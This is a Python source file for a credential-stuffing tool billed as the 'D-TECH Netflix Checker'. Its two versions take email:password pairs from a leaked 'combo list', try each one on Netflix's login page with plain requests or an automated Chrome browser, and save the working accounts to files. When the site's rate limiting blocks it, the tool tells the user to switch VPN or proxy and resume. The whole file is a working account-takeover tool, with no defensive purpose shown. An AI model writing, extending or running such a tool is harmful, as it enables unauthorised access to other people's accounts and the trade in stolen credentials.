import os
import sys
import time
import requests
import logging
from pathlib import Path
from bs4 import BeautifulSoup
from colorama import Fore, Style
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Prints a cool D-TECH banner."""
    print("\033[38;5;51m")
    print("========================================")
    print("           D-TECH Netflix Checker")
    print("========================================")
    print("\033[38;5;7m")

def print_menu():
    """Prints the menu options for the user."""
    print("\033[38;5;7mOptions:")
    print("1 - D-TECH NETFLIX ACCOUNT TESTER V1.1")
    print("2 - D-TECH NETFLIX ACCOUNT TESTER V2.2")
    print("q - Quit")
    print("\033[38;5;45mSelect an option: \033[38;5;7m", end='')

def run_v1_1():
    """Runs the D-TECH NETFLIX ACCOUNT TESTER V1.1 script."""
    print(Fore.CYAN + '[+]--- D-TECH Netflix Account Checker v1.1 ---[+]')
    print(Fore.GREEN + '-------------- Made by preasx24 --------------' + Style.RESET_ALL)

    contex = 0
    contno = 0
    accPass = []
    outfile = open('good.txt', 'w')

    login_url = 'https://www.netflix.com/Login?locale=es-CL'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
        with open("netflix", "r") as filestream:
            lines = filestream.readlines()
            print(Fore.CYAN + f'[!] Loaded {len(lines)} accounts from "netflix"' + Style.RESET_ALL)
            
            for line in lines:
                currentline = line.strip().split(':')
                if len(currentline) != 2:
                    print(Fore.YELLOW + '[!] Skipping invalid line format.' + Style.RESET_ALL)
                    continue
                
                session = requests.Session()
                login_page = session.get(login_url, headers=headers)
                soup = BeautifulSoup(login_page.text, 'html.parser')
                
                login_data = {
                    'email': currentline[0],
                    'password': currentline[1]
                }
                
                response = session.post(login_url, data=login_data, headers=headers)
                if 'browse' in response.url:
                    print(Fore.GREEN + f'[+] Account valid: {currentline[0]}' + Style.RESET_ALL)
                    contex += 1
                    sign_out_url = 'http://www.netflix.com/SignOut?lnkctr=mL'
                    session.get(sign_out_url, headers=headers)
                    accPass.append(currentline[0] + ':' + currentline[1])
                else:
                    print(Fore.RED + f'[-] Account invalid: {currentline[0]}' + Style.RESET_ALL)
                    contno += 1

        print(Fore.CYAN + '[!] Writing valid accounts to good.txt...' + Style.RESET_ALL)
        for account in accPass:
            print(Fore.GREEN + f'[+] {account}' + Style.RESET_ALL)
            outfile.write(str(account) + '\n')

    except Exception as e:
        print(Fore.RED + f'[!] An error occurred: {e}' + Style.RESET_ALL)

    print(Fore.CYAN + '[+] Summary:')
    print(Fore.GREEN + f'Valid accounts: {contex}' + Style.RESET_ALL)
    print(Fore.RED + f'Invalid accounts: {contno}' + Style.RESET_ALL)

def run_v2_2():
    """Runs the D-TECH NETFLIX ACCOUNT TESTER V2.2 script."""
    # Custom Banner
    def show_banner():
        print("\033[38;5;51m")
        print("========================================")
        print("           D-TECH Netflix Checker")
        print("========================================")
        print("\033[38;5;7m")

    # Custom User Options
    def user_options():
        print("\033[38;5;7mOptions:")
        print("1 - Account Checker")
        print("2 - Combo Splitter")
        print("q - Quit")

    # Setup
    counter = 0
    hits = 0
    user = []
    passw = []
    updated_list = []
    files = []
    resume_flag = False
    clear_page = 0
    directory = str(Path(__file__).parent)

    for file_ in os.listdir(directory):
        files.append(file_)

    page = "https://www.netflix.com/login"

    show_banner()

    while True:
        logging.getLogger().setLevel(logging.CRITICAL)
        counter = 0
        show_banner()
        user_options()
        options = input("\033[38;5;45mPick an option or (q)uit: \033[38;5;7m")

        while True:
            if options == "1":
                # Account Checker
                show_banner()
                if resume_flag:
                    print("\033[38;5;7m\nResume file found. Resuming from given combo.")
                print("\n\033[38;5;7m")
                
                while counter < len(user):
                    if len(user) == 0:
                        print("\n\033[38;5;226mNo Accounts available.\n")
                        break
                    try:
                        print(
                            "\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(
                                str(counter), user[counter], passw[counter].strip()), end=''
                        )
                        browser_options = Options()
                        browser_options.add_argument(
                            'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
                        browser = webdriver.Chrome(options=browser_options)
                        browser.set_window_size(500, 700)
                        browser.get(page)
                        time.sleep(0.7)
                        if browser.find_elements(By.XPATH, '//button[@id="onetrust-reject-all-handler"]'):
                            button = browser.find_element(By.XPATH, '//button[@id="onetrust-reject-all-handler"]')
                            button.click()
                            time.sleep(0.7)
                        if browser.find_elements(By.XPATH, '//button[@data-uia="login-toggle-button"]'):
                            if browser.find_element(By.XPATH,
                                                    '//button[@data-uia="login-toggle-button"]').text == "Use password":
                                button = browser.find_element(By.XPATH,
                                                              '//*[@id="appMountPoint"]/div/div/div[2]/div/form/button[2]')
                                button.click()
                        time.sleep(0.7)
                        login = browser.find_element(By.XPATH, '//input[@name="userLoginId"]')
                        password = browser.find_element(By.XPATH, '//input[@name="password"]')
                        login.send_keys(user[counter])
                        time.sleep(0.7)
                        password.send_keys(passw[counter].strip())
                        time.sleep(0.7)
                        action = ActionChains(browser)
                        password.send_keys(Keys.TAB)
                        password.send_keys(Keys.ENTER)
                        time.sleep(0.7)
                        if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH,
                                                                                                      '//div[@id="loginErrorMessage"]'):
                            print("\033[38;5;196m Invalid Account", end='')
                        if browser.current_url == 'https://www.netflix.com/browse' or browser.find_elements(By.XPATH,
                                                                                                        '//div[@class="profiles-gate-container"]'):
                            print("\033[38;5;46m Valid Account - Stored", end='')
                            hits += 1
                            with open('valid', 'a') as valid:
                                valid.write("{}:{}\n".format(user[counter], passw[counter]))
                    except:
                        request = requests.get(page)
                        if request.status_code == 403:
                            print(
                                "\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
                            with open('resume', 'a') as resume:
                                for line in range(len(updated_list)):
                                    resume.write("{}\n".format(updated_list[line].strip()))
                            resume.close()
                            exit()
                    finally:
                        # Close the browser in the finally block
                        if 'browser' in locals():
                            browser.quit()  # Use quit() instead of close() to close the entire browser instance
                        sys.stdout.write("\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8" % (
                            hits, str(counter), str(len(user))))
                        sys.stdout.flush()
                    if len(updated_list) > 1:
                        del updated_list[0]
                    if clear_page > 10:
                        show_banner()
                        clear_page = 0
                    time.sleep(1)
                    counter += 1
                    clear_page += 1
                print("\n\033[38;5;226mAll done.")
                input("\n\033[38;5;226mPress Enter.")
                if resume_flag:
                    os.remove('resume')
                break
            if options == "2":
                # Combo Splitter
                show_banner()
                user = []
                passw = []
                try:
                    with open('netflix', 'r') as net:
                        for line in net.readlines():
                            user.append(line.split(":")[0])
                            passw.append(line.split(":")[1].split(" ")[0])
                        print("\n\033[38;5;7mUser : password combinations sorted.\n\nYou can now run the checker.")
                        input("\n\nPress Enter...")
                except IndexError:
                    print("\n\n\033[38;5;255mThere is something wrong with the combolist.\nCheck for extra spaces, extra characters\nOr anything else that shouldn't be there.\nEnding.")
                    exit()
                except FileNotFoundError:
                    print("\n\n\033[38;5;255mCombo-list not found. Place it in the main directory,\nand make sure it's named 'netflix' (no file extension, or capitalization).\nEnding.")
                    exit()
            if options == "q":
                # Exit
                exit()
            else:
                break

def main():
    """Main function to display the interface and handle user input."""
    while True:
        clear_screen()
        print_banner()
        print_menu()
        choice = input().strip().lower()
        if choice == "1":
            run_v1_1()
        elif choice == "2":
            run_v2_2()
        elif choice == "q":
            print("\033[38;5;226mExiting...")
            sys.exit()
        else:
            print("\033[38;5;196mInvalid option. Please try again.\033[38;5;7m")
            time.sleep(1)

if __name__ == "__main__":
    main()
